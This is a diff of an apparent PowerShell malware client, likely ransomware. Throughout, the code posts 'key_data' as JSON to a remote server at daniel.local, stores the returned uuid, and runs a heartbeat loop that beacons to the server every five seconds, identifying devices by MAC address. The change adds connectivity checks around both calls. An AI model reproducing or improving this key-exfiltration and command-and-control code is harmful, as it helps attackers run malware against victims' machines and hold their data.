@@ -45,12 +45,15 @@ $functions = {
     $completed = $false
 
     while (-not $completed){
-        try{
-        $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($key_data|ConvertTo-Json) -ContentType "application/json"
-        $uuid = ($response.content | ConvertFrom-Json).uuid
-        $completed = $true
-    }
-    catch{}
+        if (Is_Connected -ne $null){
+            try{
+                $response = Invoke-WebRequest -Uri http://daniel.local/ -Method POST -Body ($key_data|ConvertTo-Json) -ContentType "application/json"
+                $uuid = ($response.content | ConvertFrom-Json).uuid
+                $completed = $true
+            }
+            catch{}
+        }
+        else{break}
     }
 
     #---------------------------------------------------------------------------------------------------------------------
@@ -60,9 +63,12 @@ $functions = {
     #It will be using the unique MAC address to differentiate the different devices
     function Send_HeartBeat{
         while(1){
-            $url = $heartbeat + "uuid=" + $uuid
-            Invoke-WebRequest -Uri $url -UseBasicParsing
-            Start-Sleep -s 5
+            if (Is_Connected -ne $null){
+                $url = $heartbeat + "uuid=" + $uuid
+                Invoke-WebRequest -Uri $url -UseBasicParsing
+                Start-Sleep -s 5
+            }
+            else{break}
         }
     }
 
